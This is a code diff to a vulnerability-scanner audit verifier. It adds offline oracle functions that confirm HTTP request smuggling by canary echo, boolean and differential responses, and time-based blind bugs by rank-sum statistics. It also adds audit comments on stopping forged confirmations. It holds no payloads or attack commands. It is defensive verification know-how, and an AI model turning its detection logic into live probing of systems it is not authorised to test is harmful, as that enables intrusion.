@@ -33,24 +33,34 @@ WHAT IT PROVES (offline, no target, no network):
     token is verified over ``checkpoint_hash`` with the system ``openssl ts`` (still VIGIL-free) and its
     genTime SUPERSEDES the median — a witness-honesty-independent "existed no-later-than T".
 
-WHAT IT DOES NOT DO (the documented boundary — same as verify_pcf): for the general oracle bodies it does
-NOT re-fire the oracle. Re-executing a full deterministic oracle over a retained ``oracle_context`` — the
+WHAT IT DOES: this file re-fires the oracle STANDALONE for every oracle whose body is PURE and
+STDLIB-ONLY, re-deriving the verdict from the retained ``oracle_context`` with ZERO VIGIL import — the
 check that turns "the bytes are authentic and bound" into "the oracle is genuinely silent / genuinely
-fired" — is framework-specific (it needs the oracle bodies) and is the VIGIL verifier's job
-(``prove_driver.verify_prove_certificate`` / ``remediation_cert.verify_remediation_certificate`` /
-``attestation_log.verify_log``). THE EXCEPTION is the posture tier, whose oracles are pure, offline,
-deterministic functions of their retained ``oracle_context`` — so this file DOES re-fire them standalone,
-in TWO forms: (1) the predicate RE-EXECUTABLE probe kernel (a pure JSON-AST evaluator, ``_reexecute_posture``);
-and (2) L3 — a faithful VIGIL-FREE port of each of the SIX posture oracle bodies
+fired". It covers, as byte-for-byte VIGIL-FREE ports of the in-tree ``verify.oracles`` bodies:
+(1) the ACHIEVED_STATE predicate RE-EXECUTABLE probe kernel (a pure JSON-AST evaluator, ``_reexecute_posture``);
+(2) the SIX posture oracle bodies
 (``verify.oracles.{policy_path,k8s_posture,k8s_workload_posture,cloud_posture,mesh_posture,cicd_posture}_oracle``)
-as ``posture_*_fires`` + the ``reexecute_posture_oracle`` context reader (section 8b) — so a posture FACT's
-retained ``oracle_context`` re-fires with ZERO VIGIL import and yields the SAME fire/no-fire verdict (a
-byte-for-byte semantic-parity differential test pins each family to the in-tree oracle). Both forms confirm
-the verdict is the correct function of the retained values, WITHOUT proving the values are live (that still
-needs a VIGIL re-run; see the posture section). Otherwise this file checks SIGNATURES,
-BINDING, and STRUCTURE — authenticity, cross-binding, digest binding, chain, anti-rollback, quorum, and the
-median clock — all fully checkable standalone. A single flipped byte anywhere flips a standalone verdict to
-NOT SOUND.
+as ``posture_*_fires`` + the ``reexecute_posture_oracle`` context reader (section 8b); and (3) — Lane C/C1 —
+the GENERAL pure families (section 8c) via ``reexecute_general_oracle``: differential_response (+ the
+smuggling-desync differential), timing, boolean_inference, side_effect, reflection_context, evaluation
+(+ ssi), error_signature, sanitizer_signal, system_prompt_disclosure, prompt_injection, the sql/command/
+nosql injection-breakout parse-proofs, weak_crypto_artifact and prototype_pollution. A byte-for-byte
+semantic-parity test pins every ported family to the in-tree oracle on BOTH ``fired`` AND ``conclusive``
+(integration/tests/test_{posture,general}_reexecutable.py). Each re-derivation confirms the verdict is the
+correct FUNCTION of the retained values, WITHOUT proving the values are live (that still needs a VIGIL
+re-run — the producer-supplied honesty bound). Otherwise this file checks SIGNATURES, BINDING, and
+STRUCTURE — authenticity, cross-binding, digest binding, chain, anti-rollback, quorum, and the median
+clock — all fully checkable standalone. A single flipped byte anywhere flips a standalone verdict to NOT SOUND.
+
+WHAT IT DOES NOT DO (the documented, genuinely-IRREDUCIBLE boundary): it does NOT re-fire the oracle
+families whose re-execution needs something beyond stdlib + the one Ed25519 lib — a live socket/DNS
+(service_reachability, tls_weakness live-handshake, active_exposure, oob_callback's external collector,
+credential_stuffing's live auth), a real browser/CDP (dom_execution / DOM-XSS, CSP-bypass), a subprocess
+tool or live cloud/cluster-API capture (imds/secret/gcp/iam/k8s_rbac, mobile MobSF), or a heavy dependency
+(version_range -> packaging; certificate_validity -> cryptography.x509; saml/jwt structural forgery ->
+signxml / full cryptography). For those, re-verification rests on the SIGNATURE + an in-VIGIL re-run (the
+sound maximum; see docs/limitations/inventory.json LIMIT-audit-package-reproduction) — NAMED here as the
+boundary, never faked as reproduced.
 
 Verification only — no offensive capability, never writes, never phones home, deterministic.
 
@@ -77,17 +87,24 @@ import argparse
 import base64
 import binascii
 import datetime
+import difflib
 import hashlib
+import html
 import json
+import math
 import re
 import shutil
 import subprocess
 import sys
 import tempfile
+from collections import Counter
 from collections.abc import Mapping
+from dataclasses import dataclass, field
+from html.parser import HTMLParser
 from pathlib import Path
-from typing import Any, Optional
-from urllib.parse import urlsplit
+from statistics import median
+from typing import Any, Optional, Sequence
+from urllib.parse import quote as _urlquote, urlsplit
 
 from cryptography.exceptions import InvalidSignature
 from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
@@ -1830,6 +1847,2838 @@ def reexecute_posture_oracle(oracle_context: Any) -> tuple[Optional[bool], str]:
     return None, ""
 
 
+
+
+# ---------------------------------------------------------------------------
+# 8c. L3-GENERAL — VIGIL-FREE ports of the PURE, STDLIB-ONLY general oracle bodies
+#     + a canonical-context reader that re-fires them over a retained oracle_context.
+#
+# The posture tier (section 8b) and the predicate kernel (section 8) re-execute the
+# posture + achieved-state ACHIEVED_STATE oracles standalone. This section extends that to the
+# GENERAL (non-posture, non-predicate) oracle set whose bodies are PURE and STDLIB-ONLY — the
+# web-vuln differential / statistical / structural families. Each ``*_oracle`` below is a
+# BYTE-FOR-BYTE copy of the corresponding body in ``framework.v2.verify.oracles`` (extracted by
+# AST over its exact source + the transitive closure of its pure module-level helpers; the
+# closure is provably stdlib-only — see the parity harness integration/tests/
+# test_general_reexecutable.py, which pins every ported class to the in-tree oracle on BOTH
+# ``fired`` AND ``conclusive`` over a representative retained-evidence battery).
+#
+# The two shims below (``OracleKind`` string constants + an ``OracleSignal`` dataclass that
+# reproduces the Pydantic model's ``fired -> conclusive`` coercion) let the oracle bodies compile
+# UNCHANGED with zero VIGIL import — the whole point: a third party re-derives these general FACT
+# verdicts with nothing installed (stdlib + the one Ed25519 lib this file already uses).
+#
+# WHAT THIS DOES (Step 2 of the audit package — see docs/limitations/inventory.json
+# LIMIT-audit-package-reproduction): for a FACT whose retained ``oracle_context`` carries one of
+# the ported families' keys, ``reexecute_general_oracle`` re-RUNS the deterministic oracle and
+# returns the SAME fire/no-fire + conclusive verdict the in-tree oracle would — so the audit
+# package no longer merely binds the verdict, it RE-DERIVES it standalone.
+#
+# HONEST BOUND (identical to the posture tier): re-firing proves the verdict is the correct
+# FUNCTION of the retained evidence — it does NOT prove the retained evidence reflects the live
+# target (that still needs an in-VIGIL live re-run). The GENUINELY-IRREDUCIBLE oracle families —
+# those whose re-execution needs a live socket/DNS, a real browser/CDP, a subprocess tool, heavy
+# deps (packaging / cryptography.x509 / signxml), or an external OOB collector — are NOT ported
+# here and are named in LIMIT-audit-package-reproduction; their re-verification rests on the
+# signature + an in-VIGIL re-run (the sound maximum), never faked as reproduced.
+# ---------------------------------------------------------------------------
+class OracleKind:
+    """String-valued stand-in for ``framework.v2.verify.models.OracleKind`` (the ``.value`` of each
+    member). The ported bodies only read ``OracleKind.X`` to stamp a signal's kind; parity is on
+    ``fired``/``conclusive``, so the string value is sufficient and keeps the bodies byte-identical."""
+    DIFFERENTIAL_RESPONSE = "differential_response"
+    TIMING = "timing"
+    BOOLEAN_INFERENCE = "boolean_inference"
+    SIDE_EFFECT = "side_effect"
+    REFLECTION_CONTEXT = "reflection_context"
+    EVALUATION = "evaluation"
+    ERROR_SIGNATURE = "error_signature"
+    SANITIZER_SIGNAL = "sanitizer_signal"
+    SYSTEM_PROMPT_DISCLOSURE = "system_prompt_disclosure"
+    PROMPT_INJECTION = "prompt_injection"
+    PROTOTYPE_POLLUTION = "prototype_pollution"
+    SQL_INJECTION_BREAKOUT = "sql_injection_breakout"
+    COMMAND_INJECTION_BREAKOUT = "command_injection_breakout"
+    NOSQL_INJECTION_BREAKOUT = "nosql_injection_breakout"
+    TLS_WEAKNESS = "tls_weakness"
+
+
+@dataclass
+class OracleSignal:
+    """Stand-in for ``framework.v2.verify.models.OracleSignal`` carrying exactly the fields the
+    ported bodies set, and reproducing the model's ``_fired_implies_conclusive`` validator (a FIRED
+    signal is always conclusive). Parity is asserted on ``fired`` AND ``conclusive``."""
+    kind: Any
+    fired: bool
+    confidence: float = 0.0
+    evidence: str = ""
+    observed: dict = field(default_factory=dict)
+    conclusive: bool = False
+
+    def __post_init__(self) -> None:
+        if self.fired and not self.conclusive:
+            self.conclusive = True
+
+
+# --- the byte-faithful ported oracle bodies + their pure stdlib helper closure ------------------
+_VOID_ELEMENTS = frozenset({
+    "area", "base", "br", "col", "embed", "hr", "img", "input",
+    "link", "meta", "param", "source", "track", "wbr",
+})
+
+
+@dataclass(frozen=True)
+class _Response:
+    status: int | None
+    body: str
+    latency_ms: float | None
+
+
+def _coerce_text(value: Any) -> str:
+    if value is None:
+        return ""
+    if isinstance(value, bytes):
+        return value.decode("utf-8", errors="replace")
+    if isinstance(value, str):
+        return value
+    return str(value)
+
+
+def _normalize_response(value: Any) -> _Response:
+    """Accept a plain string/bytes body, or a mapping with any of
+    {status|status_code, body|text|content, latency_ms|elapsed_ms}."""
+    if isinstance(value, Mapping):
+        status = value.get("status", value.get("status_code"))
+        body = value.get("body", value.get("text", value.get("content", "")))
+        latency = value.get("latency_ms", value.get("elapsed_ms"))
+        return _Response(
+            status=int(status) if status is not None else None,
+            body=_coerce_text(body),
+            latency_ms=float(latency) if latency is not None else None,
+        )
+    return _Response(status=None, body=_coerce_text(value), latency_ms=None)
+
+
+def _json_signature(obj: Any, prefix: str = "") -> set[tuple[str, str]]:
+    """The set of (json-pointer path, value-TYPE) pairs in a JSON document.
+    Records structure, not values — so a changed timestamp/nonce (same path,
+    same type) is invisible, but a new/removed record (a new path) shows."""
+    out: set[tuple[str, str]] = set()
+    if isinstance(obj, dict):
+        out.add((prefix or "/", "object"))
+        for k in obj:
+            out |= _json_signature(obj[k], f"{prefix}/{k}")
+    elif isinstance(obj, list):
+        out.add((prefix or "/", "array"))
+        for i, v in enumerate(obj):
+            out |= _json_signature(v, f"{prefix}/{i}")
+    else:
+        out.add((prefix or "/", type(obj).__name__))
+    return out
+
+
+class _TagPathCounter(HTMLParser):
+    """Builds a multiset of ancestor-tag-paths (e.g. ``html>body>table>tr``) over
+    a document, using stdlib parsing only. The multiset is invariant to text/
+    attribute values, so token noise does not move it, but an added element does."""
+
+    def __init__(self) -> None:
+        super().__init__(convert_charrefs=True)
+        self._stack: list[str] = []
+        self.counter: Counter[str] = Counter()
+
+    def handle_starttag(self, tag: str, attrs: object) -> None:
+        self._stack.append(tag)
+        self.counter[">".join(self._stack)] += 1
+        if tag in _VOID_ELEMENTS:
+            self._stack.pop()
+
+    def handle_startendtag(self, tag: str, attrs: object) -> None:
+        self._stack.append(tag)
+        self.counter[">".join(self._stack)] += 1
+        self._stack.pop()
+
+    def handle_endtag(self, tag: str) -> None:
+        if tag in self._stack:
+            while self._stack and self._stack[-1] != tag:
+                self._stack.pop()
+            if self._stack:
+                self._stack.pop()
+
+
+def _parse_structure(body: str) -> tuple[str, Any]:
+    """Return ('json', path-type set) or ('html', tag-path multiset). JSON is
+    tried first; anything else is parsed as HTML with the stdlib parser (no
+    third-party dependency). A parse failure degrades to ('text', None) so the
+    caller can skip cleanly."""
+    import json as _json
+
+    text = body if isinstance(body, str) else _coerce_text(body)
+    stripped = text.lstrip()
+    if stripped[:1] in "{[":
+        try:
+            return "json", _json_signature(_json.loads(text))
+        except (ValueError, TypeError):
+            pass
+    parser = _TagPathCounter()
+    try:
+        parser.feed(text)
+        parser.close()
+    except Exception:
+        return "text", None
+    if not parser.counter:
+        return "text", None
+    return "html", parser.counter
+
+
+def structural_diff(baseline_body: Any, mutated_body: Any) -> float:
+    """A structure-aware divergence score in [0, 1], invariant to token noise
+    (CSRF tokens, nonces, timestamps) and sensitive to real change (an added
+    record, an extra ``<tr>``, a new form). 0 = structurally identical.
+
+    JSON: symmetric difference of (path, type) sets over their union. HTML:
+    multiset difference of tag-paths over the total. Different document kinds
+    (JSON vs HTML) score 1.0. Unparseable bodies score 0.0 (no structural
+    claim — the lexical dimension still applies)."""
+    kind_b, sig_b = _parse_structure(baseline_body)
+    kind_m, sig_m = _parse_structure(mutated_body)
+    if kind_b == "text" or kind_m == "text":
+        return 0.0
+    if kind_b != kind_m:
+        return 1.0
+    if kind_b == "json":
+        union = sig_b | sig_m
+        return (len(sig_b ^ sig_m) / len(union)) if union else 0.0
+    # html multisets
+    diff = sum((sig_b - sig_m).values()) + sum((sig_m - sig_b).values())
+    total = sum(sig_b.values()) + sum(sig_m.values())
+    return (diff / total) if total else 0.0
+
+
+def _noisy_or(weights: list[float]) -> float:
+    """Combine independent evidence weights: 1 - prod(1 - w). Clamped to 0.99
+    so a deterministic oracle never claims certainty it cannot have."""
+    product = 1.0
+    for w in weights:
+        product *= 1.0 - max(0.0, min(1.0, w))
+    return min(0.99, 1.0 - product)
+
+
+_DEFAULT_DIFFERENTIAL_DIMENSIONS = frozenset({"status", "length", "lexical", "marker"})
+
+
+def differential_response_oracle(
+    baseline: Any,
+    mutated: Any,
+    discriminator: Mapping[str, Any] | str | None = None,
+) -> OracleSignal:
+    """Distinguish two observed responses.
+
+    For a boolean-based blind bug the "true" condition yields a materially
+    different response than the "false"/baseline condition; this oracle
+    quantifies that divergence lexically and structurally. For a time-based
+    blind bug a latency delta over threshold is the signal.
+
+    discriminator (all optional):
+      dimensions          : subset of {status,length,lexical,structural,latency,marker}
+                            (default: status,length,lexical,marker — ``latency`` must be
+                            asked for EXPLICITLY; see the AUDIT R6 note below)
+      length_threshold    : min fractional length change to count (default 0.05)
+      lexical_threshold   : min 1-similarity to count (default 0.10)
+      latency_threshold_ms: min added latency to count (default 1000)
+      true_marker         : string that must appear in `mutated` but not baseline
+      expect              : "differ" (default) or "same"
+    """
+    if isinstance(discriminator, str):
+        disc: dict[str, Any] = {"dimensions": [discriminator]}
+    else:
+        disc = dict(discriminator or {})
+
+    b = _normalize_response(baseline)
+    m = _normalize_response(mutated)
+
+    # AUDIT R6 — ``latency`` is NOT in the DEFAULT set. Its weight is 0.7, which is
+    # EXACTLY the verifier's HIGH_CONFIDENCE floor, so every caller that omitted a
+    # discriminator inherited a latency-ONLY confirm path: a single timing delta over
+    # two otherwise identical responses minted a FACT. That is a TIMING claim, and the
+    # engine has a dedicated statistically-sound oracle for it (``timing_oracle``:
+    # paired samples, alpha, dose-response). The fix is to remove the dimension from
+    # the DEFAULT rather than to shave its weight to 0.69 — a weight just under the
+    # floor still lets latency push a marginal second dimension over the line through
+    # the noisy-OR, and it would say "timing is weak evidence" when the honest
+    # statement is "timing is not part of this oracle's default proof at all".
+    # AUDIT (this slice) — that last sentence USED to read "callers that genuinely
+    # mean timing (the A12 request-smuggling LEAD probe) still ask for it
+    # EXPLICITLY". It is now STALE and is corrected rather than deleted, because the
+    # change of reachability matters: this slice removed that caller, and the
+    # verifier now PINS the discriminator per bug class from the AUTHORITY's table
+    # rather than accepting a producer-supplied one. So ZERO callers on the scan path
+    # can request ``latency``. The dimension remains implemented and reachable only
+    # by a direct, in-process ``differential_oracle`` call that names it — it is not
+    # dead code, but nothing in the shipped pipeline asks for it.
+    wanted = set(disc.get("dimensions") or _DEFAULT_DIFFERENTIAL_DIMENSIONS)
+    length_thr = float(disc.get("length_threshold", 0.05))
+    lexical_thr = float(disc.get("lexical_threshold", 0.10))
+    latency_thr = float(disc.get("latency_threshold_ms", 1000.0))
+    structural_thr = float(disc.get("structural_threshold", 0.02))
+    true_marker = disc.get("true_marker")
+
+    dims: list[dict[str, Any]] = []
+
+    if "status" in wanted and b.status is not None and m.status is not None:
+        differs = b.status != m.status
+        dims.append({"dim": "status", "differs": differs, "weight": 0.6 if differs else 0.0,
+                     "detail": f"{b.status} -> {m.status}"})
+
+    if "length" in wanted:
+        lb, lm = len(b.body), len(m.body)
+        ratio = abs(lb - lm) / max(lb, lm, 1)
+        differs = ratio > length_thr
+        dims.append({"dim": "length", "differs": differs,
+                     "weight": min(1.0, ratio) if differs else 0.0,
+                     "detail": f"{lb} vs {lm} bytes ({ratio:.2%})"})
+
+    if "lexical" in wanted:
+        sim = difflib.SequenceMatcher(None, b.body, m.body).ratio()
+        diff = 1.0 - sim
+        differs = diff > lexical_thr
+        dims.append({"dim": "lexical", "differs": differs,
+                     "weight": diff if differs else 0.0,
+                     "detail": f"similarity {sim:.2%}"})
+
+    if "structural" in wanted:
+        # AST-level divergence: invariant to nonce/CSRF/timestamp noise, so a
+        # page that merely reflects a per-request token does NOT read as a diff,
+        # while an added record / DOM node does. Higher precision than lexical.
+        score = structural_diff(b.body, m.body)
+        differs = score > structural_thr
+        dims.append({"dim": "structural", "differs": differs,
+                     "weight": min(1.0, score) if differs else 0.0,
+                     "detail": f"structural delta {score:.2%}"})
+
+    if "latency" in wanted and b.latency_ms is not None and m.latency_ms is not None:
+        delta = m.latency_ms - b.latency_ms
+        differs = delta >= latency_thr
+        dims.append({"dim": "latency", "differs": differs,
+                     "weight": 0.7 if differs else 0.0,
+                     "detail": f"+{delta:.0f} ms"})
+
+    if "marker" in wanted and true_marker:
+        present = true_marker in m.body and true_marker not in b.body
+        dims.append({"dim": "marker", "differs": present,
+                     "weight": 0.9 if present else 0.0,
+                     "detail": f"true_marker {'present' if present else 'absent'}"})
+
+    differing = [d for d in dims if d["differs"]]
+    diff_conf = _noisy_or([d["weight"] for d in differing])
+
+    expect = disc.get("expect", "differ")
+    if expect == "same":
+        fired = len(differing) == 0 and len(dims) > 0
+        confidence = min(0.99, 1.0 - diff_conf) if fired else 0.0
+        evidence = ("responses indistinguishable across "
+                    + ", ".join(d["dim"] for d in dims)) if fired else (
+            "responses diverge on " + ", ".join(d["dim"] for d in differing))
+    else:
+        fired = len(differing) > 0
+        confidence = diff_conf if fired else 0.0
+        evidence = ("responses diverge on "
+                    + ", ".join(f"{d['dim']} ({d['detail']})" for d in differing)) if fired else (
+            "responses indistinguishable")
+
+    return OracleSignal(
+        kind=OracleKind.DIFFERENTIAL_RESPONSE,
+        fired=fired,
+        confidence=confidence,
+        evidence=evidence,
+        observed={"dimensions": dims, "expect": expect},
+    )
+
+
+_SMUGGLING_MIN_CANARY_LEN = 12
+
+
+_SMUGGLING_MIN_CANARY_ENTROPY = 2.5   # bits/char — a random alnum token clears ~4-6
+
+
+_SMUGGLING_CANARY_RE = re.compile(r"^[A-Za-z0-9]{12,}$")
+
+
+_SMUGGLING_MANGLED_STATUSES = frozenset({400, 405, 501, 502})
+
+
+def _smuggling_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.95,
+                      conclusive: bool = False) -> OracleSignal:
+    # Reuses the FROZEN DIFFERENTIAL_RESPONSE kind (already in _ALL_ORACLES) but is reached
+    # ONLY via the verifier's `smuggling_desync` ctx key, which no benchmark/scan/engage
+    # finding carries — so `make gate` stays byte-identical and oracle_version is untouched.
+    # A fire is always decisive; a NON-fire is `conclusive` only for a channel-confirmed
+    # negative (both legs answered, no canary leaked) — an undecidable / low-entropy /
+    # no-channel non-fire is a LEAD/INCONCLUSIVE, never a CLEAN.
+    return OracleSignal(kind=OracleKind.DIFFERENTIAL_RESPONSE, fired=fired,
+                        confidence=(conf if fired else 0.0),
+                        conclusive=(True if fired else conclusive),
+                        evidence=evidence, observed=observed)
+
+
+def _smuggling_leg(leg: Any) -> "dict | None":
+    """Coerce one burst leg's retained record to ``{channel, status, reason, body}`` (pure).
+    ``None`` when the leg is not a mapping (no observation to adjudicate)."""
+    if not isinstance(leg, Mapping):
+        return None
+    status = leg.get("status")
+    try:
+        status = int(status) if status is not None else None
+    except (TypeError, ValueError):
+        status = None
+    return {"channel": bool(leg.get("channel", False)), "status": status,
+            "reason": _coerce_text(leg.get("reason")), "body": _coerce_text(leg.get("body"))}
+
+
+def smuggling_desync_oracle(observed: Any) -> OracleSignal:
+    """Fire when VIGIL's OWN second request on a connection whose first request carried a
+    framing conflict is DETERMINISTICALLY CORRUPTED by a leftover smuggled prefix — proven by
+    a UNIQUE per-probe canary echoed in the conflict leg's second response AND absent from an
+    identical no-conflict control leg's second response. The re-verifiable, timing-free
+    achieved-state proof of HTTP request smuggling (CWE-444). Pure + deterministic; never
+    raises. See the module comment above for the full contract."""
+    obs = observed if isinstance(observed, Mapping) else {}
+    canary = _coerce_text(obs.get("canary")).strip()
+    technique = _coerce_text(obs.get("technique")).strip() or "CL.TE"
+    base = {"technique": technique, "canary_len": len(canary)}
+
+    # 1. The canary must be a UNIQUE, high-entropy VIGIL token, or a substring match could be
+    #    coincidental (a benign body containing the token). A weak/absent canary is a LEAD.
+    if (len(canary) < _SMUGGLING_MIN_CANARY_LEN or not _SMUGGLING_CANARY_RE.match(canary)
+            or _shannon_bits_per_char(canary) < _SMUGGLING_MIN_CANARY_ENTROPY):
+        return _smuggling_signal(
+            False, observed=base,
+            evidence=(f"the per-probe canary must be a unique VIGIL token (>= {_SMUGGLING_MIN_CANARY_LEN} "
+                      "alnum chars AND >= 2.5 bits/char) so a substring match cannot be coincidental — "
+                      "cannot adjudicate a desync (LEAD)"))
+
+    conflict = _smuggling_leg(obs.get("conflict"))
+    control = _smuggling_leg(obs.get("control"))
+    if conflict is None or control is None:
+        return _smuggling_signal(
+            False, observed=base,
+            evidence="the conflict and/or the no-conflict control second-request record is missing — "
+                     "no differential to adjudicate (inconclusive)")
+
+    # 2. BOTH VIGIL-owned second requests must have established a channel — a leg that read no
+    #    response examined nothing (INCONCLUSIVE, never a desync and never a CLEAN).
+    if not conflict["channel"] or not control["channel"]:
+        return _smuggling_signal(
+            False, observed={**base, "conflict_channel": conflict["channel"],
+                             "control_channel": control["channel"]},
+            evidence="a burst leg established no channel (the second request read no response) — "
+                     "cannot adjudicate the desync differential (inconclusive)")
+
+    echo_conflict = canary in conflict["body"]
+    echo_control = canary in control["body"]
+    mangled = conflict["status"] in _SMUGGLING_MANGLED_STATUSES and conflict["status"] != control["status"]
+    detail = {**base, "echo_in_conflict": echo_conflict, "echo_in_control": echo_control,
+              "conflict_status": conflict["status"], "control_status": control["status"],
+              "mangled_method_status": mangled}
+
+    # 3. The canary echoing in the CONTROL leg (identical bytes, WELL-FORMED framing) means the
+    #    endpoint reflects the canary into the second response regardless of the conflict — the
+    #    echo is NOT attributable to a desync. REFUSE (LEAD), never mint.
+    if echo_control:
+        return _smuggling_signal(
+            False, observed=detail,
+            evidence="the unique canary also appears in the NO-CONFLICT control's second response — the "
+                     "echo is not attributable to a framing desync (an endpoint reflecting it regardless) "
+                     "(REFUSE)")
+
+    # 4. No echo in the conflict leg's second response: the back-end did not leak the smuggled
+    #    prefix — no desync on this technique/origin. Both channels answered ⇒ channel-confirmed
+    #    negative (a benign / anti-smuggling front-end that normalises the conflict lands here).
+    if not echo_conflict:
+        return _smuggling_signal(
+            False, conclusive=True, observed=detail,
+            evidence=(f"the {technique} conflict burst's second response did NOT echo the unique canary "
+                      "(and neither did the control) — the origin did not desync this technique; a plain "
+                      f"mangled-method status ({conflict['status']}) alone does not mint; did not fire"))
+
+    # 5. The unique canary leaked into VIGIL's OWN second request's response on the conflict
+    #    socket but NOT on the identical well-formed control socket — the ONLY difference (the
+    #    framing conflict) caused the back-end to treat the smuggled prefix as the start of the
+    #    next request. An achieved desync.
+    return _smuggling_signal(
+        True, conf=0.95, observed=detail,
+        evidence=(f"HTTP request smuggling ({technique}): a UNIQUE per-probe canary embedded in the smuggled "
+                  "prefix of VIGIL's first (conflict) request was ECHOED in VIGIL's OWN second request's "
+                  "response on that socket, yet is ABSENT from an identical no-conflict control second "
+                  "response — the back-end treated the smuggled prefix as the start of the next request "
+                  "(a desync), proven by the differential, not by timing"
+                  + (f"; the second request's method was also mangled (status {conflict['status']})"
+                     if mangled else "")))
+
+
+def _normal_cdf(z: float) -> float:
+    """Standard-normal CDF via erf (pure stdlib)."""
+    return 0.5 * (1.0 + math.erf(z / math.sqrt(2.0)))
+
+
+def _rank_average(values: Sequence[float]) -> tuple[list[float], list[int]]:
+    """Average (fractional) ranks of ``values`` and the sizes of each tie group.
+
+    Ties share the mean of the ranks they would occupy — the standard
+    correction, so the Mann-Whitney statistic is exact under ties."""
+    order = sorted(range(len(values)), key=lambda i: values[i])
+    ranks = [0.0] * len(values)
+    tie_sizes: list[int] = []
+    i = 0
+    n = len(values)
+    while i < n:
+        j = i
+        while j + 1 < n and values[order[j + 1]] == values[order[i]]:
+            j += 1
+        avg = (i + j) / 2.0 + 1.0  # ranks are 1-based
+        for k in range(i, j + 1):
+            ranks[order[k]] = avg
+        if j > i:
+            tie_sizes.append(j - i + 1)
+        i = j + 1
+    return ranks, tie_sizes
+
+
+def _mann_whitney(baseline: Sequence[float], treatment: Sequence[float]) -> tuple[float, float]:
+    """One-sided Mann-Whitney U for H1: treatment stochastically GREATER than
+    baseline. Returns (z, p_value) using the normal approximation with tie and
+    continuity correction. p is the probability of a U this extreme under H0
+    (no location shift). Small samples still get an honest — if conservative —
+    normal-approximation p; there is no exact-distribution table here."""
+    n1, n2 = len(baseline), len(treatment)
+    if n1 == 0 or n2 == 0:
+        return 0.0, 1.0
+    ranks, tie_sizes = _rank_average(list(baseline) + list(treatment))
+    r_treat = sum(ranks[n1:])
+    u_treat = r_treat - n2 * (n2 + 1) / 2.0
+    mu = n1 * n2 / 2.0
+    n = n1 + n2
+    tie_term = sum(t ** 3 - t for t in tie_sizes)
+    var = (n1 * n2 / 12.0) * ((n + 1) - tie_term / (n * (n - 1))) if n > 1 else 0.0
+    if var <= 0.0:
+        # Zero variance: either everything tied (no signal) or perfectly
+        # separated with n too small — treat as no usable statistic.
+        return 0.0, 1.0
+    sigma = math.sqrt(var)
+    # continuity correction toward the null
+    z = (u_treat - mu - 0.5) / sigma
+    p = 1.0 - _normal_cdf(z)
+    return z, p
+
+
+def _hodges_lehmann(baseline: Sequence[float], treatment: Sequence[float]) -> float:
+    """The Hodges-Lehmann estimator of the median shift (treatment - baseline):
+    the median of all pairwise differences. A robust effect-size measure that
+    resists outliers (one slow request cannot manufacture a shift)."""
+    diffs = [t - b for t in treatment for b in baseline]
+    return median(diffs) if diffs else 0.0
+
+
+_TIMING_MAX_ALPHA = 0.01
+
+
+def timing_oracle(
+    baseline_samples: Any,
+    treatment_samples: Any,
+    *,
+    injected_ms: float | None = None,
+    alpha: float = 0.01,
+    effect_floor_fraction: float = 0.5,
+    absolute_floor_ms: float = 250.0,
+    min_samples: int = 5,
+    dose: Mapping[str, Any] | None = None,
+) -> OracleSignal:
+    """Confirm a time-based blind vulnerability with a real hypothesis test.
+
+    A single averaged comparison or a fixed latency threshold (what sqlmap/Burp
+    largely do) false-positives under jitter and false-negatives under load.
+    This fires only when ALL of the following hold, which together are robust to
+    both:
+
+      1. **Rank-sum test.** A one-sided Mann-Whitney U rejects H0 (no shift) at
+         ``alpha`` — the delay-injected requests are stochastically slower, by a
+         distribution-free test that does not assume Gaussian latencies.
+      2. **Effect-size floor.** The Hodges-Lehmann median shift is at least
+         ``effect_floor_fraction`` of the injected delay (or ``absolute_floor_ms``
+         when the delay is unknown) — a statistically-significant-but-tiny shift
+         (network drift) is refused.
+      3. **Dose-response (optional).** When ``dose`` supplies a second treatment
+         at a different delay, the observed shift must scale with the injected
+         delay (e.g. SLEEP(2) ~= 2x SLEEP(1)) — a constant offset cannot fake
+         this. ``dose = {"low_ms": .., "low_samples": [..], "high_ms": .., "high_samples": [..]}``.
+
+    Deterministic and pure: given the same samples it returns the same signal.
+
+    RED-PEN B3b — MONOTONE RATCHET on the two firing knobs. ``alpha`` and
+    ``injected_ms`` used to be read verbatim, and the ``framework.v2 verify`` path
+    fed them straight out of an UNTRUSTED report's oracle context. Measured on
+    samples ``[100..104]`` vs ``[105..109]`` (a 5 ms shift, i.e. ordinary jitter):
+    defaults refused it ("median shift 5ms < floor 250ms"), but
+    ``timing_injected_ms: 1.0`` drove the floor to 0 ms and CONFIRMED, and
+    ``timing_alpha: 0.5`` accepted a p of 0.047 (and 0.028 on a bimodal set that
+    cleared the 250 ms floor outright). Both are
+    now clamped HERE, at the authority, so every caller is covered — including
+    call sites this module does not own:
+
+      * ``alpha`` is clamped to at most ``_TIMING_MAX_ALPHA`` — a caller may only
+        make the test STRICTER, never more permissive;
+      * ``injected_ms`` may only RAISE the effect floor
+        (``floor = max(absolute_floor_ms, effect_floor_fraction * injected_ms)``),
+        so a declared 5 s sleep still demands a ~2.5 s shift while a declared 1 ms
+        one can no longer erase the 250 ms absolute floor.
+
+    ``dose`` is NOT clamped, deliberately: it is DEMOTE-ONLY. ``fired`` requires
+    ``dose_ok``, a malformed dose spec sets ``dose_ok=True``/``dose_conf=0.0``, and
+    once ``alpha <= 0.01`` any fired signal already has ``p_conf = 0.9``, so
+    ``dose_conf`` cannot lift a signal over a confirmation threshold it would not
+    otherwise clear. A hostile dose can only REFUSE a fire; removing it would
+    strictly WEAKEN this oracle. See ``test_timing_dose_is_demote_only``.
+    """
+    alpha = min(float(alpha), _TIMING_MAX_ALPHA)
+    base = [float(x) for x in (baseline_samples or [])]
+    treat = [float(x) for x in (treatment_samples or [])]
+    if len(base) < min_samples or len(treat) < min_samples:
+        return OracleSignal(
+            kind=OracleKind.TIMING, fired=False, confidence=0.0,
+            evidence=f"insufficient samples ({len(base)}/{len(treat)}, need >= {min_samples} each)",
+            observed={"n_baseline": len(base), "n_treatment": len(treat)},
+        )
+
+    z, p = _mann_whitney(base, treat)
+    shift = _hodges_lehmann(base, treat)
+    # RED-PEN B3b: the declared injected delay may only RAISE the floor, never
+    # lower it below the absolute floor (`injected_ms: 1.0` used to give floor 0).
+    floor = (max(absolute_floor_ms, effect_floor_fraction * injected_ms)
+             if injected_ms else absolute_floor_ms)
+
+    reject = p < alpha
+    effect_ok = shift >= floor
+
+    dose_ok = True
+    dose_detail = ""
+    dose_conf = 0.0
+    if dose is not None:
+        low = [float(x) for x in (dose.get("low_samples") or [])]
